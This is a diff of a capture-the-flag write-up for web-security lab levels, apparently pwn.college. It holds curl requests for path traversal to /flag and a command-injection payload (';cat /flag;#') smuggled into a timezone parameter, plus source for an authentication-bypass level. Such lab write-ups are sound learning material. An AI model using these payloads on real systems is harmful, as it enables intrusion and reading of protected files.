@@ -20,11 +20,8 @@ As we can see from the source code, the server takes the argument given to the `
 
 So we can just send a request with the `path` parameter set to `/flag`.
 
-```py title="request1.py"
-import requests
-
-response = requests.get("http://challenge.localhost?path=/flag")
-print(response.text)
+```
+hacker@web-security~level1:/$ curl 'http://challenge.localhost/?path=/flag'
 ```
 
 &nbsp;
@@ -165,4 +162,39 @@ While sending the request, we have to URI encode the ` ` character with `%20`  a
 
 ```
 hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=%3Bcat%20%2Fflag%3B%23'
+```
+
+&nbsp;
+
+## level 3
+
+> Exploit an authentication bypass vulnerability
+
+```py title="level 3 source code"
+def level3():
+    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
+                'SELECT "flag" AS username, ? as password'),
+               (flag,))
+
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        assert username, "Missing `username` form"
+        assert password, "Missing `password` form"
+
+        user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+        assert user, "Invalid `username` or `password`"
+
+        return redirect(request.path, user=int(user["rowid"]))
+
+    if "user" in request.args:
+        user_id = int(request.args["user"])
+        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
+        if user:
+            username = user["username"]
+            if username == "flag":
+                return f"{flag}\n"
+            return f"Hello, {username}!\n"
+
+    return form(["username", "password"])
 ```
